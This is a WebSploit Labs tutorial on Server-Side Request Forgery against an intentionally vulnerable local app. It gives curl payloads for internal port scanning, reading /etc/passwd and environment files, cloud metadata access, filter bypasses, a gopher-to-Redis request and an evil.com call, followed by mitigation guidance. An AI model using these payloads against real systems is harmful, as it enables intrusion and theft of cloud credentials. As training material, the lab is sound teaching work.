# SSRF Forge: A WebSploit Labs Internal Threat Simulation
*Created by Omar Santos for [WebSploit Labs](https://websploit.org/) - Cybersecurity Education*

[WebSploit Labs](https://websploit.org/) is a learning environment created by Omar Santos for different Cybersecurity Ethical Hacking, Bug Hunting, Incident Response, Digital Forensics, and Threat Hunting training sessions. WebSploit Labs includes several intentionally vulnerable applications running in Docker containers on top of Kali Linux or Parrot Security OS, several additional tools, and over 9,000 cybersecurity resources.

[WebSploit Labs](https://websploit.org/) has been used by many colleges and universities in different countries. 

WebSploit comes with a set of intentionally vulnerable applications running in Docker containers on top of Kali Linux or Parrot Security OS, several additional tools, and over 9,000 cybersecurity resources. Those containers were created in x86_64 architecture and can be run in any x86_64 Linux system. However, if you are using a macOS in Apple Silicon, you can complete this lab without the need of running the containers.

## 🎯 Learning Objectives
By completing this lab, students will learn to:
- Identify Server-Side Request Forgery (SSRF) vulnerabilities
- Exploit SSRF to access internal services
- Understand the impact of SSRF attacks
- Learn mitigation techniques

## 📋 Prerequisites
- Basic understanding of HTTP requests
- Familiarity with web application testing
- Burp Suite or similar proxy tool (optional)
- Access to the SSRF vulnerable application

## 🚀 Lab Setup

### Install Dependencies
```bash
pip install -r requirements.txt
```

### Running the Application
```bash
# There is a ssrf_app.py file in the SSRF directory
# Run it with:
python3 ssrf_app.py
```

### Docker Setup (Recommended)

There is a Dockerfile in the SSRF directory. However, the following example is provided for your convenience:

```dockerfile
FROM python:3.9-slim

WORKDIR /app
COPY ssrf_app.py .
RUN pip install flask requests urllib3

EXPOSE 5000
CMD ["python", "ssrf_app.py"]
```

To build and run the Docker container:

```bash
# Build and run
docker build -t websploit-ssrf .
docker run -p 5000:5000 websploit-ssrf
```

## 🔍 Understanding SSRF

**Server-Side Request Forgery (SSRF)** is a vulnerability that allows an attacker to make requests from the server to arbitrary destinations. This can lead to:
- Access to internal services
- Information disclosure
- Port scanning of internal networks
- Cloud metadata access
- Potential remote code execution

## 🧪 Testing Methodology

### Phase 1: Reconnaissance and Mapping

#### 1.1 Identify Input Points
Navigate to `http://localhost:5000` and identify all endpoints that accept URLs:

- **Web Content Fetcher** (`/fetch`)
- **Website Screenshot Service** (`/screenshot`) 
- **Webhook Tester** (`/webhook`)
- **URL Metadata Analyzer** (`/analyze`)
- **Link Validator** (`/validate`)
- **API Proxy** (`/api/proxy`)
- **Health Check** (`/health`)

#### 1.2 Test Normal Functionality
Before testing for SSRF, understand normal behavior:

```bash
# Test with legitimate external URL
curl -X POST http://localhost:5000/fetch -d "url=https://httpbin.org/get"
```

### Phase 2: Basic SSRF Testing

#### 2.1 Internal Network Access
Test if you can access internal services:

```bash
# Test localhost access
curl -X POST http://localhost:5000/fetch -d "url=http://localhost:5000/health"

# Test different localhost variations
- http://127.0.0.1:5000
- http://0.0.0.0:5000
- http://[::1]:5000
- http://localhost.localdomain:5000
```

#### 2.2 Port Scanning
Use SSRF to scan internal ports:

```bash
# Common internal services
curl -X POST http://localhost:5000/fetch -d "url=http://127.0.0.1:22"    # SSH
curl -X POST http://localhost:5000/fetch -d "url=http://127.0.0.1:3306"  # MySQL
curl -X POST http://localhost:5000/fetch -d "url=http://127.0.0.1:6379"  # Redis
curl -X POST http://localhost:5000/fetch -d "url=http://127.0.0.1:27017" # MongoDB
```

#### 2.3 Protocol Testing
Test different protocols:

```bash
# File protocol (if supported)
curl -X POST http://localhost:5000/fetch -d "url=file:///etc/passwd"

# FTP protocol
curl -X POST http://localhost:5000/fetch -d "url=ftp://internal-ftp-server/"

# LDAP protocol
curl -X POST http://localhost:5000/fetch -d "url=ldap://internal-ldap/"
```

### Phase 3: Advanced SSRF Exploitation

#### 3.1 Cloud Metadata Access
If running in cloud environments:

```bash
# AWS EC2 metadata
curl -X POST http://localhost:5000/fetch -d "url=http://169.254.169.254/latest/meta-data/"

# Google Cloud metadata
curl -X POST http://localhost:5000/fetch -d "url=http://metadata.google.internal/computeMetadata/v1/"

# Azure metadata
curl -X POST http://localhost:5000/fetch -d "url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

#### 3.2 Bypass Techniques

**URL Encoding:**
```bash
# Double URL encoding
curl -X POST http://localhost:5000/fetch -d "url=http%253A%252F%252F127.0.0.1%253A22"
```

**Alternative IP Representations:**
```bash
# Decimal representation of 127.0.0.1
curl -X POST http://localhost:5000/fetch -d "url=http://2130706433:5000"

# Hexadecimal representation
curl -X POST http://localhost:5000/fetch -d "url=http://0x7f000001:5000"

# Mixed representations
curl -X POST http://localhost:5000/fetch -d "url=http://127.1:5000"
```

**DNS-based bypasses:**
```bash
# Using DNS that resolves to localhost
curl -X POST http://localhost:5000/fetch -d "url=http://localtest.me:5000"
curl -X POST http://localhost:5000/fetch -d "url=http://lvh.me:5000"
```

#### 3.3 Webhook Exploitation
Test the webhook functionality:

```bash
# Use webhook.site for testing
curl -X POST http://localhost:5000/webhook \
  -d "webhook_url=https://webhook.site/your-unique-id" \
  -d "data=SSRF test payload"

# Test internal webhook
curl -X POST http://localhost:5000/webhook \
  -d "webhook_url=http://127.0.0.1:5000/health" \
  -d "data=internal request"
```

### Phase 4: Impact Assessment

#### 4.1 Information Gathering
Document what information you can gather:

- Internal service discovery
- Response headers revealing server information
- Error messages disclosing internal paths
- Network topology information

#### 4.2 Chaining Attacks
Combine SSRF with other vulnerabilities:

```bash
# Test for reflected content (potential XSS)
curl -X POST http://localhost:5000/analyze -d "target_url=http://evil.com/xss-payload"

# Test for SSRF + Local File Inclusion
curl -X POST http://localhost:5000/fetch -d "url=file:///proc/self/environ"
```

## 🔧 Testing with Burp Suite

### 4.1 Intercepting Requests
1. Configure browser to use Burp proxy
2. Navigate to vulnerable endpoints
3. Capture and modify requests in Burp Repeater

### 4.2 Automated Testing
Use Burp's SSRF detection extensions:
- **Collaborator** for out-of-band testing
- **Intruder** for payload fuzzing
- **Scanner** for automated SSRF detection

## 🎯 Specific Test Cases

### Test Case 1: Basic Internal Access
```bash
# Objective: Access the application's own health endpoint
curl -X POST http://localhost:5000/fetch -d "url=http://localhost:5000/health"

# Expected: Should return health check information
# Impact: Confirms SSRF vulnerability exists
```

### Test Case 2: Port Scanning
```bash
# Objective: Discover internal services
for port in 22 80 443 3306 5432 6379 8080; do
  echo "Testing port $port:"
  curl -s -X POST http://localhost:5000/validate -d "link=http://127.0.0.1:$port" | grep -E "(accessible|Status Code)"
done
```

### Test Case 3: Protocol Smuggling
```bash
# Objective: Test different protocols
curl -X POST http://localhost:5000/fetch -d "url=gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a"

# Expected: Potential Redis interaction via Gopher protocol
```

### Test Case 4: Time-based Detection
```bash
# Objective: Detect SSRF through response timing
time curl -X POST http://localhost:5000/fetch -d "url=http://127.0.0.1:22"
time curl -X POST http://localhost:5000/fetch -d "url=http://127.0.0.1:12345"

# Compare response times to detect open/closed ports
```

## 🛡️ Detection and Mitigation

### Detection Techniques
1. **Network Monitoring**: Monitor outbound connections from web servers
2. **Log Analysis**: Look for unusual internal URL requests
3. **Response Analysis**: Check for internal service responses in application output

### Mitigation Strategies
1. **Input Validation**: Whitelist allowed domains/protocols
2. **Network Segmentation**: Restrict server's network access
3. **URL Parsing**: Use secure URL parsing libraries
4. **Response Filtering**: Don't return raw responses to users

### Code Fix Examples
```python
# Example mitigation code
import ipaddress
from urllib.parse import urlparse

def is_safe_url(url):
    """Check if URL is safe from SSRF"""
    try:
        parsed = urlparse(url)
        
        # Block non-HTTP protocols
        if parsed.scheme not in ['http', 'https']:
            return False
            
        # Block private IP ranges
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback:
            return False
            
        return True
    except:
        return False
```

## 📊 Lab Report Template

### Vulnerability Summary
- **Vulnerability Type**: Server-Side Request Forgery (SSRF)
- **Severity**: High
- **Affected Endpoints**: [List discovered endpoints]

### Technical Details
- **Root Cause**: Lack of input validation on URL parameters
- **Attack Vectors**: [Document successful attack methods]
- **Impact**: [Describe potential damage]

### Proof of Concept
```bash
# Include working exploit commands
curl -X POST http://localhost:5000/fetch -d "url=http://127.0.0.1:22"
```

### Remediation
- Implement URL validation
- Use allowlists for permitted domains
- Add network-level restrictions

## 🎓 Learning Questions

1. **Identification**: How can you identify SSRF vulnerabilities in web applications?

2. **Exploitation**: What are the most effective techniques for bypassing SSRF filters?

3. **Impact**: What are the potential business impacts of SSRF vulnerabilities?

4. **Prevention**: How would you implement secure URL handling in a web application?

5. **Detection**: What monitoring strategies would help detect SSRF attacks?

## 📚 Additional Resources

- [OWASP Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security - SSRF](https://portswigger.net/web-security/ssrf)
- [OWASP Top 10 Web Application Security Risks](https://owasp.org/Top10/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Generative AI Top 10](https://genai.owasp.org/)
- [OWASP AI Red Teaming & Evaluation](https://genai.owasp.org/initiatives/#ai-redteaming)
- [NIST Cybersecurity Framework](https://www.nist.gov/cybersecurity-framework)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security-academy)

